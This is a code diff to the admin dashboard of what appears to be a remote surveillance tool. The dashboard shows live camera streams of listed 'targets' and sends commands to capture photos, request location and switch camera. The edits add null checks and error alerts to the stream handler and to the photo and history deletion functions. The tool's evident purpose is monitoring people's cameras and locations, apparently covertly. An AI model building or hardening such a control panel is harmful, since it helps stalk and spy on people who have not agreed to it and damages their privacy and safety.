@@ -208,7 +208,7 @@ function initDashboard() {
 
         socket.on("update-live-stream", (data) => {
             const img = document.getElementById(`stream-${data.socketId}`);
-            if (img) img.src = data.frameData;
+            if (img && data.frameData) img.src = data.frameData;
         });
 
         socket.on("new-photo", (photo) => {
@@ -241,6 +241,7 @@ function updateLinkToggleButton() {
 function toggleViewMore(id) {
     const detailsDiv = document.getElementById(`details-${id}`);
     const btn = document.getElementById(`btn-view-${id}`);
+    if (!detailsDiv || !btn) return;
     if (detailsDiv.classList.contains("show")) {
         detailsDiv.classList.remove("show");
         btn.textContent = "View More";
@@ -271,7 +272,7 @@ function renderTargets(users) {
             <div class="card">
                 <div class="card-stream-container">
                     <div class="stream-badge">LIVE STREAM</div>
-                    <img id="stream-${target.id}" class="stream" src="" alt="Connecting stream...">
+                    <img id="stream-${target.id}" class="stream" src="" alt="Waiting for stream...">
                 </div>
                 <div class="card-body">
                     <div class="card-info">
@@ -342,8 +343,12 @@ function renderPhotos(photos) {
 async function clearHistory() {
     if (!confirm("Are you sure you want to clear all history logs?")) return;
     try {
-        await fetch("/api/admin/history", { method: "DELETE" });
-    } catch(e){}
+        const res = await fetch("/api/admin/history", { method: "DELETE" });
+        const data = await res.json();
+        if (!data.ok) alert("Failed to clear history.");
+    } catch(e) {
+        alert("Error clearing history.");
+    }
 }
 
 function capturePhoto(id) { socket.emit("admin-trigger-capture", id); }
@@ -351,7 +356,13 @@ function requestLocation(id) { socket.emit("admin-request-location", id); }
 function switchCamera(id) { socket.emit("admin-switch-camera", id); }
 
 async function deletePhoto(id) {
-    try { await fetch(`/api/admin/photos/${id}`, { method: "DELETE" }); } catch (e) {}
+    try {
+        const res = await fetch(`/api/admin/photos/${id}`, { method: "DELETE" });
+        const data = await res.json();
+        if (!data.ok) alert("Failed to delete photo.");
+    } catch (e) {
+        alert("Error deleting photo.");
+    }
 }
 </script>
 </body>
